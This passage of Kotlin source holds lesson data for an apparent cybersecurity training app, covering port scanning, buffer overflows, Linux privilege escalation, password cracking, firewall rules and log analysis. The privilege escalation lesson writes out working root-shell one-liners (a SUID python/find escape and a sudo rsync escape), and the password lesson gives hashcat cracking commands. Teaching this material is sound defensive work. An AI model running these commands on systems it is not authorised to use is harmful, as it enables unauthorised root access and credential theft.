    print(f"{'PORT':<8} {'STATE':<8} {'SERVICE':<10} BANNER")
    with concurrent.futures.ThreadPoolExecutor(max_workers=50) as ex:
        futures = {ex.submit(scan_port, host, p): p for p in COMMON_PORTS}
        for fut in concurrent.futures.as_completed(futures):
            port, is_open, banner = fut.result()
            if is_open:
                svc = COMMON_PORTS.get(port, "unknown")
                print(f"{port:<8} {'OPEN':<8} {svc:<10} {banner[:50]}")

fast_scan("127.0.0.1")
                        """.trimIndent(),
                        codeLanguage = "python",
                        quiz = Quiz(
                            question = "What is a SYN scan and why is it sometimes called 'stealthy'?",
                            options = listOf(
                                "It uses UDP instead of TCP",
                                "It sends a SYN but never completes the handshake, so many older systems log only completed connections",
                                "It encrypts all packets",
                                "It impersonates another IP address"
                            ),
                            correctIndex = 1,
                            explanation = "A SYN scan (half-open) sends SYN, gets SYN-ACK, then sends RST instead of ACK. Older systems only log fully established connections, so the scan may not appear in logs. Modern IDS/IPS catches it regardless."
                        )
                    )
                )
            ),
            Course(
                id = "course_exploits",
                trackId = "track_red_team",
                title = "Exploitation Fundamentals",
                description = "Vulnerabilities, CVEs, and the exploitation lifecycle.",
                difficulty = Difficulty.EXPERT,
                xpReward = 350,
                lessons = listOf(
                    Lesson(
                        id = "exploit_bufferoverflow",
                        courseId = "course_exploits",
                        order = 1,
                        title = "Buffer Overflows",
                        content = """
A **buffer overflow** writes data past the end of a fixed-size buffer, corrupting adjacent memory — including the return address.

**How C-style memory works:**
```
High address
┌─────────────────┐
│  Stack frame    │
│  return address │ ← Attacker overwrites this
│  saved EBP      │
│  local vars     │
│  buffer[64]     │ ← Attacker writes 100 bytes here
└─────────────────┘
Low address
```

**Vulnerable C code:**
```c
void vuln(char *input) {
    char buf[64];
    strcpy(buf, input);  // no bounds check!
}
```

**Attack flow:**
1. Send 64+ bytes to overflow the buffer
2. Overwrite the return address with the address of your shellcode
3. When `vuln()` returns, CPU jumps to your code
4. Shellcode executes with the process's privileges

**Why this matters today:**
- Still found in embedded devices, legacy code, IoT firmware
- Modern mitigations (understand them all):
  - **ASLR** — Address Space Layout Randomisation: randomises stack/heap addresses
  - **NX/DEP** — No-Execute: stack memory can't be executed
  - **Stack canaries** — random value before return address; crash if overwritten
  - **CFI** — Control-Flow Integrity: validates jump targets

**Modern bypass techniques (academic):**
- **ROP (Return-Oriented Programming)** — chains existing code gadgets instead of injecting shellcode; bypasses NX
- **Heap spraying** — fills heap with shellcode, improves reliability against ASLR
- **ret2libc** — return to existing libc functions instead of shellcode

**Defender takeaway:**
- Use memory-safe languages (Rust, Go, Java, Python) where possible
- Enable all compiler protections: `-fstack-protector-all`, `-pie`, `-z relro`
- Use ASLR (`/proc/sys/kernel/randomize_va_space = 2`)
                        """.trimIndent(),
                        codeExample = """
# Safe Python simulation of what a buffer overflow does conceptually
# Python doesn't have raw memory access — this illustrates the concept

class SimulatedStackFrame:
    def __init__(self):
        self.buffer        = bytearray(64)
        self.saved_ebp     = 0xDEADBEEF
        self.return_addr   = 0x080484B6  # legitimate function
        self._canary       = 0xC0FFEEEE  # stack canary

    def strcpy_unsafe(self, data: bytes):
        # No bounds check — simulates C's strcpy
        for i, b in enumerate(data):
            if i < 64:
                self.buffer[i] = b
            elif i == 64:
                self.saved_ebp = (self.saved_ebp & 0xFFFF0000) | b
            elif i == 65:
                # Overwrite return address
                self.return_addr = int.from_bytes(data[65:69], 'little')
                break

    def check_canary(self):
        return self._canary == 0xC0FFEEEE

frame = SimulatedStackFrame()
print(f"Before: return_addr = 0x{frame.return_addr:08X}")

# Normal input
frame.strcpy_unsafe(b"Hello, World!")
print(f"Normal: return_addr = 0x{frame.return_addr:08X}")  # unchanged

# Overflow — overwrite return address with 0x41414141 ("AAAA")
overflow = b"A" * 65 + b"\x41\x41\x41\x41"
frame.strcpy_unsafe(overflow)
print(f"Attack: return_addr = 0x{frame.return_addr:08X}")  # 0x41414141!
print(f"Canary intact: {frame.check_canary()}")
                        """.trimIndent(),
                        codeLanguage = "python",
                        quiz = Quiz(
                            question = "Which mitigation makes buffer overflow exploits harder by randomising memory addresses each run?",
                            options = listOf("Stack canaries", "NX/DEP", "ASLR", "CFI"),
                            correctIndex = 2,
                            explanation = "ASLR (Address Space Layout Randomisation) randomises where the stack, heap, and libraries are loaded each time. The attacker can't hard-code the address to jump to."
                        )
                    ),
                    Lesson(
                        id = "exploit_privesc",
                        courseId = "course_exploits",
                        order = 2,
                        title = "Privilege Escalation",
                        content = """
**Privilege escalation** elevates access from a low-privilege user to root/SYSTEM.

**Linux privesc checklist:**
```bash
# 1. Who am I and what groups?
id; whoami; groups

# 2. SUID binaries (run as owner, not caller)
find / -perm -4000 -type f 2>/dev/null
# Dangerous SUIDs: find, vim, python, bash, cp, nmap

# 3. Writable /etc/passwd or /etc/shadow
ls -la /etc/passwd /etc/shadow

# 4. Cron jobs (check for world-writable scripts)
cat /etc/crontab
ls -la /etc/cron.*
find / -name "*.sh" -writable 2>/dev/null

# 5. Sudo misconfigurations
sudo -l   # what can current user run as root?

# 6. Kernel exploits
uname -r   # check kernel version against CVEs

# 7. Running services with root privileges
ps aux | grep root

# 8. World-writable directories / sticky bit
find / -writable -type d 2>/dev/null | grep -v proc
```

**SUID exploit example:**
```bash
# If python has SUID bit set:
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# If find has SUID:
find . -exec /bin/sh \; -quit
```

**Sudo wildcard exploit:**
```bash
# /etc/sudoers: user ALL = (root) /usr/bin/rsync *
# Exploit:
sudo rsync -e 'sh -c "sh 0<&2 1>&2"' 127.0.0.1:/dev/null
```

**Defender checklist:**
- Audit SUID binaries: remove bit unless essential
- Review /etc/sudoers: avoid wildcards and `NOPASSWD` on powerful commands
- Keep kernel patched
- Use `auditd` to log privilege escalation attempts
- Implement mandatory access control (SELinux / AppArmor)
                        """.trimIndent(),
                        codeExample = """
#!/usr/bin/env python3
${"\"\"\""}
Linux privilege escalation checker.
Run on your own systems / CTF machines only.
${"\"\"\""}
import os, subprocess, stat

def check_suid_bins():
    print("\n[*] Checking for SUID binaries...")
    dangerous = {'python','python3','perl','ruby','bash','sh','find','vim','nano','cp','mv','awk'}
    try:
        result = subprocess.run(
            ['find', '/', '-perm', '-4000', '-type', 'f'],
            capture_output=True, text=True, timeout=10
        )
        for line in result.stdout.strip().split('\n'):
            name = os.path.basename(line.strip())
            if name in dangerous:
                print(f"  [!] DANGEROUS SUID: {line.strip()}")
    except Exception as e:
        print(f"  Error: {e}")

def check_writable_etc():
    print("\n[*] Checking /etc/passwd and /etc/shadow permissions...")
    for f in ['/etc/passwd', '/etc/shadow']:
        try:
            s = os.stat(f)
            if s.st_mode & stat.S_IWOTH:
                print(f"  [!!!] WORLD-WRITABLE: {f}")
            else:
                perms = oct(s.st_mode)[-3:]
                print(f"  [ok] {f}: permissions {perms}")
        except PermissionError:
            print(f"  [ok] {f}: not readable (normal for /etc/shadow)")

check_suid_bins()
check_writable_etc()
                        """.trimIndent(),
                        codeLanguage = "python",
                        quiz = Quiz(
                            question = "What does the SUID bit on an executable do?",
                            options = listOf(
                                "Makes the file read-only",
                                "Runs the file as the file's owner (often root), regardless of who executes it",
                                "Encrypts the executable",
                                "Prevents the file from being executed remotely"
                            ),
                            correctIndex = 1,
                            explanation = "SUID (Set User ID) causes the process to run with the privileges of the file's owner. If a root-owned binary has SUID and can be exploited, the attacker gets root."
                        )
                    ),
                    Lesson(
                        id = "exploit_password_attacks",
                        courseId = "course_exploits",
                        order = 3,
                        title = "Password Attacks",
                        content = """
Understanding how passwords are attacked helps you implement far stronger authentication.

**How passwords are stored (good to bad):**
```
Plaintext          → NEVER acceptable
MD5/SHA1 (unsalted) → Broken: rainbow tables, fast cracking
bcrypt/scrypt/Argon2 → Designed for passwords: slow by design, salted
```

**Hash cracking methods:**
1. **Dictionary attack** — try words from a wordlist (rockyou.txt has 14M passwords)
2. **Rule-based** — apply rules to dictionary words (`password` → `P@ssw0rd!`)
3. **Brute force** — try all combinations (only feasible for short passwords)
4. **Rainbow tables** — pre-computed hash↔plaintext pairs (defeated by salting)
5. **Credential stuffing** — use breached username/password pairs on other sites

**hashcat example (on your own hashes only):**
```bash
# MD5 dictionary attack
hashcat -m 0 hashes.txt rockyou.txt

# WPA2 handshake
hashcat -m 2500 capture.hccapx rockyou.txt -r best64.rule

# NTLM (Windows) with rules
hashcat -m 1000 ntlm.txt rockyou.txt -r dive.rule
```

**Password policies that actually help:**
- Minimum length 12+ (length > complexity)
- Block known-bad passwords via HaveIBeenPwned API
- MFA — makes cracked passwords useless
- Account lockout after N failures
- Hash with Argon2id (winner of the Password Hashing Competition)

**Argon2 in Python:**
```python
from argon2 import PasswordHasher

ph = PasswordHasher(time_cost=3, memory_cost=65536, parallelism=4)
hash = ph.hash("correct horse battery staple")
ph.verify(hash, "correct horse battery staple")  # True
# Brute forcing this takes years on modern hardware
```
                        """.trimIndent(),
                        codeExample = """
import hashlib, os, time

# Demonstrate WHY bcrypt/Argon2 are slow and why that matters for defence

def crack_md5(target_hash: str, wordlist: list) -> str | None:
    for word in wordlist:
        if hashlib.md5(word.encode()).hexdigest() == target_hash:
            return word
    return None

def sha256_with_salt(password: str, salt: bytes | None = None) -> tuple[str, bytes]:
    if salt is None:
        salt = os.urandom(16)
    digest = hashlib.sha256(salt + password.encode()).hexdigest()
    return digest, salt

# Simulate a small wordlist attack
sample_wordlist = ["password","123456","qwerty","letmein","welcome","admin","monkey"]
target = hashlib.md5("password".encode()).hexdigest()

t0 = time.time()
found = crack_md5(target, sample_wordlist * 1000)  # 7000 attempts
elapsed = time.time() - t0

print(f"MD5 cracked '{found}' — {7000/elapsed:.0f} hashes/sec")
print("At this rate: 14M rockyou.txt in", f"{14_000_000/(7000/elapsed):.0f}s")

# Salting defeats rainbow tables
h1, s = sha256_with_salt("password")
h2, _ = sha256_with_salt("password", salt=os.urandom(16))  # different salt
print(f"\nSame password, different salts:")
print(f"  Hash 1: {h1[:32]}...")
print(f"  Hash 2: {h2[:32]}...")  # completely different
                        """.trimIndent(),
                        codeLanguage = "python",
                        quiz = Quiz(
                            question = "Why is bcrypt preferred over SHA-256 for storing passwords?",
                            options = listOf(
                                "SHA-256 is too old",
                                "bcrypt produces shorter hashes",
                                "bcrypt is intentionally slow and includes a built-in salt, making brute-force and rainbow table attacks impractical",
                                "SHA-256 doesn't support Unicode passwords"
                            ),
                            correctIndex = 2,
                            explanation = "SHA-256 is designed for speed (hashing files quickly), so GPUs can compute billions per second. bcrypt has a cost factor that makes it thousands of times slower, and its built-in salt means each password produces a unique hash."
                        )
                    )
                )
            )
        )
    )

    // ─────────────────────────────────────────────────────────────────────────
    // TRACK 5 – BLUE TEAM (Defence)
    // ─────────────────────────────────────────────────────────────────────────
    private fun blueTeamTrack() = Track(
        id = "track_blue_team",
        title = "Blue Team",
        subtitle = "Detect, respond, and harden systems against attacks",
        icon = "🛡️",
        category = TrackCategory.BLUE_TEAM,
        difficulty = Difficulty.ADVANCED,
        xpReward = 1000,
        courses = listOf(
            Course(
                id = "course_hardening",
                trackId = "track_blue_team",
                title = "System Hardening",
                description = "CIS benchmarks, firewall config, and secure-by-default setups.",
                difficulty = Difficulty.ADVANCED,
                xpReward = 280,
                lessons = listOf(
                    Lesson(
                        id = "blue_firewall",
                        courseId = "course_hardening",
                        order = 1,
                        title = "Firewalls & iptables",
                        content = """
A **firewall** controls which network traffic is allowed. Every server should have one.

**iptables** — the Linux packet filter:
```bash
# Default deny everything, then whitelist
iptables -P INPUT   DROP
iptables -P FORWARD DROP
iptables -P OUTPUT  ACCEPT

# Allow established connections (responses to outbound)
iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT

# Allow loopback
iptables -A INPUT -i lo -j ACCEPT

# Allow SSH (restrict to your IP in production!)
iptables -A INPUT -p tcp --dport 22 -j ACCEPT

# Allow web traffic
iptables -A INPUT -p tcp -m multiport --dports 80,443 -j ACCEPT

# Rate limit SSH to prevent brute force
iptables -A INPUT -p tcp --dport 22 -m recent --set --name SSH
iptables -A INPUT -p tcp --dport 22 -m recent --update --seconds 60 --hitcount 4 --name SSH -j DROP

# Save rules
iptables-save > /etc/iptables/rules.v4
```

**nftables** (modern replacement):
```bash
nft add table inet filter
nft add chain inet filter input  '{ type filter hook input  priority 0; policy drop; }'
nft add chain inet filter output '{ type filter hook output priority 0; policy accept; }'
nft add rule inet filter input ct state established,related accept
nft add rule inet filter input iif lo accept
nft add rule inet filter input tcp dport { 22, 80, 443 } accept
```

**UFW (easy front-end for Ubuntu):**
```bash
ufw default deny incoming
ufw default allow outgoing
ufw allow ssh
ufw allow 80/tcp
ufw allow 443/tcp
ufw enable
ufw status verbose
```

**Network segmentation:**
- DMZ: public-facing services in an isolated zone
- Internal network: never directly reachable from internet
- Zero trust: verify every connection, even internal
                        """.trimIndent(),
                        codeExample = """
#!/usr/bin/env python3
${"\"\"\""}Audit iptables rules for common misconfigurations.${"\"\"\""}

import subprocess

def audit_iptables():
    try:
        result = subprocess.run(
            ['iptables', '-L', '-n', '-v', '--line-numbers'],
            capture_output=True, text=True
        )
        rules = result.stdout
        issues = []

        if 'ACCEPT' in rules and 'policy ACCEPT' in rules.split('\n')[1]:
            issues.append("[!] INPUT chain policy is ACCEPT (default-allow) — should be DROP")

        if '0.0.0.0/0' in rules and 'dpt:22' in rules:
            issues.append("[!] SSH (port 22) open to the world — restrict to known IPs")

        if 'limit' not in rules.lower() and '22' in rules:
            issues.append("[!] No rate limiting on SSH — vulnerable to brute force")

        if not issues:
            print("[+] No obvious firewall issues found")
        else:
            for issue in issues:
                print(issue)

        print("\n--- Current rules ---")
        print(rules[:2000])

    except FileNotFoundError:
        print("[*] iptables not available (may need root or different OS)")

audit_iptables()
                        """.trimIndent(),
                        codeLanguage = "python",
                        quiz = Quiz(
                            question = "What is the 'default deny' firewall policy?",
                            options = listOf(
                                "Block all traffic by default, then explicitly allow only what's needed",
                                "Allow all traffic by default, then block known threats",
                                "Deny traffic only during business hours",
                                "Block all inbound but allow all outbound"
                            ),
                            correctIndex = 0,
                            explanation = "Default deny (allowlist approach) is the gold standard: DROP everything and only ACCEPT traffic that you've explicitly decided is legitimate. This minimises attack surface."
                        )
                    )
                )
            ),
            Course(
                id = "course_incident_response",
                trackId = "track_blue_team",
                title = "Incident Response",
                description = "Detect breaches, contain damage, and recover.",
                difficulty = Difficulty.EXPERT,
                xpReward = 320,
                lessons = listOf(
                    Lesson(
                        id = "ir_detection",
                        courseId = "course_incident_response",
                        order = 1,
                        title = "Threat Detection & Log Analysis",
                        content = """
You can't defend what you can't see. Logs are your evidence.

**Critical log sources:**
| Log                         | Location               | What to look for             |
|-----------------------------|------------------------|------------------------------|
| Authentication              | /var/log/auth.log      | Failed logins, su, sudo      |
| Syslog                      | /var/log/syslog        | Service crashes, errors      |
| Firewall                    | /var/log/ufw.log       | Blocked/allowed connections  |
| Apache/nginx                | /var/log/nginx/        | SQLi, XSS, scanner patterns  |
| Audit daemon                | /var/log/audit/        | File access, syscalls        |
| Windows Security            | Event ID 4624/4625/... | Logon success/fail           |
| Windows PowerShell          | Event ID 4104          | Script block logging         |

**grep patterns to hunt for:**
```bash
# Failed SSH logins (brute force)
grep "Failed password" /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -rn | head

# Successful logins from unexpected IPs
grep "Accepted password" /var/log/auth.log | grep -v "192.168."

# Web scanner / SQLi patterns in nginx
grep -E "(union|select|drop|insert|1=1|' OR)" /var/log/nginx/access.log

# Base64 encoded commands (common malware technique)
grep -i "base64" /var/log/auth.log /var/log/syslog

# Cron job changes
grep "crontab" /var/log/auth.log | grep -v root
```

**SIEM tools:** Splunk, ELK Stack, Graylog
- Aggregate logs from all sources
- Set up alerts on anomalies
- Correlate events across systems (lateral movement)

**Indicators of Compromise (IOCs):**
- New listening ports
- Unexpected cron jobs
- Modified system binaries (check hashes!)
- Unknown user accounts
- Outbound connections to unusual IPs
- High CPU/network usage at odd times
                        """.trimIndent(),
                        codeExample = """
import re
from collections import Counter
from datetime import datetime

SAMPLE_LOG = ${"\"\"\""}
Oct 16 03:12:01 server sshd[1234]: Failed password for root from 45.33.32.156 port 54321 ssh2
Oct 16 03:12:03 server sshd[1234]: Failed password for root from 45.33.32.156 port 54322 ssh2
Oct 16 03:12:05 server sshd[1234]: Failed password for admin from 45.33.32.156 port 54323 ssh2
Oct 16 03:12:07 server sshd[1235]: Accepted password for deploy from 10.0.1.5 port 22 ssh2
Oct 16 03:13:01 server sshd[1234]: Failed password for root from 198.51.100.7 port 11111 ssh2
Oct 16 03:15:22 server sshd[1236]: Accepted publickey for alice from 192.168.1.45 port 22 ssh2
${"\"\"\""}  .strip()
def analyse_ssh_logs(log: str):
    failed   = re.findall(r'Failed password for (\S+) from (\S+)', log)
    accepted = re.findall(r'Accepted \S+ for (\S+) from (\S+)', log)

    print("=== SSH Brute Force Indicators ===")
    ip_attempts = Counter(ip for _, ip in failed)
    for ip, count in ip_attempts.most_common():
        flag = "[!!!]" if count >= 3 else "[!] "
        print(f"{flag} {ip}: {count} failed attempts")

    print("\n=== Successful Logins ===")
    for user, ip in accepted:
        internal = ip.startswith(("10.", "192.168.", "172."))
        src = "internal" if internal else "EXTERNAL"
        print(f"  [{src}] user={user} ip={ip}")

analyse_ssh_logs(SAMPLE_LOG)
                        """.trimIndent(),
                        codeLanguage = "python",
                        quiz = Quiz(
                            question = "Which event should trigger an immediate alert in SSH authentication logs?",
                            options = listOf(
                                "10 failed logins over 1 week from the same internal IP",
                                "Hundreds of failed login attempts for 'root' from an external IP in minutes",
                                "A user logging in during business hours",
                                "Password authentication being used instead of key-based"
                            ),
                            correctIndex = 1,
                            explanation = "Hundreds of rapid failed login attempts for privileged accounts (root, admin) from external IPs is a clear brute-force attack pattern and should trigger an immediate alert and IP block."
                        )
                    )
                )
            )
        )
    )
}
